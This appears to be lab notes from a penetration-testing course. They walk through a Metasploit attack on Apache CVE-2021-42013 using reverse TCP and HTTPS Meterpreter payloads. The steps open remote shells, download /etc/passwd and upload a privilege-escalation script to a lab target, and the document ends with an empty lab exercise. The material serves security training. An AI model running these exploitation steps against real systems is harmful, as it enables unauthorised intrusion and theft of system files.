# Meterpreter Payload

Review compatible Meterpreter payloads of the exploit module and use 64bit meterpreter_reverse_tcp
>``` shell
>msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
>
># ========== Expected Result ==========
>Compatible Payloads
>===================
>
>   #   Name                                              Disclosure Date  Rank    Check  Description
>   -   ----                                              ---------------  ----    -----  -----------
>   ...
>   7   payload/linux/x64/meterpreter/bind_tcp                             normal  No     Linux Mettle x64, Bind TCP Stager
>   8   payload/linux/x64/meterpreter/reverse_tcp                          normal  No     Linux Mettle x64, Reverse TCP Stager
>   9   payload/linux/x64/meterpreter_reverse_http                         normal  No     Linux Meterpreter, Reverse HTTP Inline
>   10  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
>   11  payload/linux/x64/meterpreter_reverse_tcp                          normal  No     Linux Meterpreter, Reverse TCP Inline
>   ...
># =====================================
>
>msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 11
>
># ========== Expected Result ==========
>payload => linux/x64/meterpreter_reverse_tcp
># =====================================
>
>msf6 exploit(multi/http/apache_normalize_path_rce) > show options
>
># ========== Expected Result ==========
>...
>Payload options (linux/x64/meterpreter_reverse_tcp):
>
>   Name   Current Setting  Required  Description
>   ----   ---------------  --------  -----------
>   LHOST  192.168.119.2    yes       The listen address (an interface may be specified)
>   LPORT  4444             yes       The listen port
>...
># =====================================
>```

Display compatible payloads of the exploit module (1)
>``` shell
>msf6 exploit(multi/http/apache_normalize_path_rce) > run
>
># ========== Expected Result ==========
>[*] Started reverse TCP handler on 192.168.119.4:4444 
>[*] Using auxiliary/scanner/http/apache_normalize_path as check
>[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
>[*] Scanned 1 of 1 hosts (100% complete)
>[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
>[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_reverse_tcp command payload
>[*] Meterpreter session 4 opened (192.168.119.4:4444 -> 192.168.50.16:35538) at 2022-08-08 05:20:20 -0400
>[!] This exploit may require manual cleanup of '/tmp/GfRglhc' on the target
># =====================================
>
>meterpreter > help
>
># ========== Expected Result ==========
>Core Commands
>=============
>
>    Command                   Description
>    -------                   -----------
>    ?                         Help menu
>    background                Backgrounds the current session
>    ...
>    channel                   Displays information or control active channels
>    close                     Closes a channel
>    ...
>    info                      Displays information about a Post module
>    ...
>    load                      Load one or more meterpreter extensions
>    ...
>    run                       Executes a meterpreter script or Post module
>    secure                    (Re)Negotiate TLV packet encryption on the session
>    sessions                  Quickly switch to another session
>    ...
>...
>
>Stdapi: System Commands
>=======================
>
>    Command       Description
>    -------       -----------
>    execute       Execute a command
>    getenv        Get one or more environment variable values
>    getpid        Get the current process identifier
>    getuid        Get the user that the server is running as
>    kill          Terminate a process
>    localtime     Displays the target system local date and time
>    pgrep         Filter processes by name
>    pkill         Terminate processes by name
>    ps            List running processes
>    shell         Drop into a system command shell
>    suspend       Suspends or resumes a list of processes
>    sysinfo       Gets information about the remote system, such as OS
># =====================================
>```

Display compatible payloads of the exploit module (2)
>``` shell
>meterpreter > sysinfo
>
># ========== Expected Result ==========
>Computer     : 172.29.0.2
>OS           : Ubuntu 20.04 (Linux 5.4.0-122-generic)
>Architecture : x64
>BuildTuple   : x86_64-linux-musl
>Meterpreter  : x64/linux
># =====================================
>
>meterpreter > getuid
>
># ========== Expected Result ==========
>Server username: daemon
># =====================================
>```

Start a channel and background it
>``` shell
>meterpreter > shell
>
># ========== Expected Result ==========
>Process 194 created.
>Channel 1 created.
>id
>uid=1(daemon) gid=1(daemon) groups=1(daemon)
>^Z
>Background channel 1? [y/N]  y
># =====================================
>```

Start a second channel and background it
>``` shell
>mmeterpreter > shell
>
># ========== Expected Result ==========
>Process 196 created.
>Channel 2 created.
>whoami
>daemon
>^Z
>Background channel 2? [y/N]  y
># =====================================
>```

List all active channels and interact with channel 1
>``` shell
>meterpreter > channel -l
>
># ========== Expected Result ==========
>    Id  Class  Type
>    --  -----  ----
>    1   3      stdapi_process
>    2   3      stdapi_process
># =====================================
>
>meterpreter > channel -i 1
>
># ========== Expected Result ==========
>Interacting with channel 1...
>
>id
>uid=1(daemon) gid=1(daemon) groups=1(daemon)
># =====================================
>```

List all File system Commands of Meterpreter
>``` shell
>meterpreter > help
>
># ========== Expected Result ==========
>...
>Stdapi: File system Commands
>============================
>
>    Command       Description
>    -------       -----------
>    cat           Read the contents of a file to the screen
>    cd            Change directory
>    checksum      Retrieve the checksum of a file
>    chmod         Change the permissions of a file
>    cp            Copy source to destination
>    del           Delete the specified file
>    dir           List files (alias for ls)
>    download      Download a file or directory
>    edit          Edit a file
>    getlwd        Print local working directory
>    getwd         Print working directory
>    lcat          Read the contents of a local file to the screen
>    lcd           Change local working directory
>    lls           List local files
>    lpwd          Print local working directory
>    ls            List files
>    mkdir         Make directory
>    mv            Move source to destination
>    pwd           Print working directory
>    rm            Delete the specified file
>    rmdir         Remove directory
>    search        Search for files
>    upload        Upload a file or directory
>...  
># =====================================
>```

Change local directory and download /etc/passwd from the target machine
>``` shell
>meterpreter > lpwd
>
># ========== Expected Result ==========
>/home/kali
># =====================================
>
>meterpreter > lcd /home/kali/Downloads
>
>meterpreter > lpwd
>
># ========== Expected Result ==========
>/home/kali/Downloads
># =====================================
>
>meterpreter > download /etc/passwd
>
># ========== Expected Result ==========
>[*] Downloading: /etc/passwd -> /home/kali/Downloads/passwd
>[*] Downloaded 1.74 KiB of 1.74 KiB (100.0%): /etc/passwd -> /home/kali/Downloads/passwd
>[*] download   : /etc/passwd -> /home/kali/Downloads/passwd
># =====================================
>
>meterpreter > lcat /home/kali/Downloads/passwd
>
># ========== Expected Result ==========
>root:x:0:0:root:/root:/bin/bash
>...
># =====================================
>```

Uploading unix-privesc-check to the target machine
>``` shell
>meterpreter > upload /usr/bin/unix-privesc-check /tmp/
>
># ========== Expected Result ==========
>[*] uploading  : /usr/bin/unix-privesc-check -> /tmp/
>[*] uploaded   : /usr/bin/unix-privesc-check -> /tmp//unix-privesc-check
># =====================================
>
>meterpreter > ls /tmp
>
># ========== Expected Result ==========
>Listing: /tmp
>=============
>
>Mode              Size     Type  Last modified              Name
>----              ----     ----  -------------              ----
>...
>100644/rw-r--r--  36801    fil   2022-08-08 05:26:15 -0400  unix-privesc-check
># =====================================
>```

Display Meterpreter HTTPS non-staged payload (1)
>``` shell
>meterpreter > exit
>
># ========== Expected Result ==========
>[*] Shutting down Meterpreter...
>
>[*] 192.168.50.16 - Meterpreter session 4 closed.  Reason: User exit
># =====================================
>
>msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
>
># ========== Expected Result ==========
>Compatible Payloads
>===================
>
>   #   Name                                              Disclosure Date  Rank    Check  Description
>   -   ----                                              ---------------  ----    -----  -----------
>   ...
>   10  payload/linux/x64/meterpreter_reverse_https                        normal  No     Linux Meterpreter, Reverse HTTPS Inline
>   ...
># =====================================
>```

Display Meterpreter HTTPS non-staged payload (2)
>``` shell
>msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 10
>
># ========== Expected Result ==========
>payload => linux/x64/meterpreter_reverse_https
># =====================================
>
>msf6 exploit(multi/http/apache_normalize_path_rce) > show options
>
># ========== Expected Result ==========
>...
>Payload options (linux/x64/meterpreter_reverse_https):
>
>   Name   Current Setting  Required  Description
>   ----   ---------------  --------  -----------
>   LHOST  192.168.119.2    yes       The local listener hostname
>   LPORT  4444             yes       The local listener port
>   LURI                    no        The HTTP Path
>...
># =====================================
>```

Display output of Meterpreter HTTPS non-staged payload
>``` shell
>msf6 exploit(multi/http/apache_normalize_path_rce) > run
>
># ========== Expected Result ==========
>[*] Started HTTPS reverse handler on https://192.168.119.4:4444
>[*] Using auxiliary/scanner/http/apache_normalize_path as check
>[+] http://192.168.50.16:80 - The target is vulnerable to CVE-2021-42013 (mod_cgi is enabled).
>[*] Scanned 1 of 1 hosts (100% complete)
>[*] http://192.168.50.16:80 - Attempt to exploit for CVE-2021-42013
>[*] http://192.168.50.16:80 - Sending linux/x64/meterpreter_reverse_https command payload
>[*] https://192.168.119.4:4444 handling request from 192.168.50.16; (UUID: qtj6ydxw) Redirecting stageless connection from /5VnUXDPXWg8tIisgT9LKKgwTqHpOmN8f7XNCTWkhcIUx8BfEHpEp4kLUgOa_JWrqyM8EB with UA 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36 Edg/97.0.1072.69'
>...
>[*] https://192.168.119.4:4444 handling request from 192.168.50.16; (UUID: qtj6ydxw) Attaching orphaned/stageless session...
>[*] Meterpreter session 5 opened (192.168.119.4:4444 -> 127.0.0.1) at 2022-08-08 06:12:42 -0400
>[!] This exploit may require manual cleanup of '/tmp/IkXnnbYT' on the target
>
>meterpreter > 
># =====================================
>```

Lab 1 - Follow the steps from this section and launch the exploit module with the Meterpreter payload payload/linux/x64/meterpreter_reverse_https. Once a session is spawned, use the search command within the Meterpreter command prompt and search for a file named passwords. Display the output of this file to obtain the flag.
>``` shell
>
>```
>
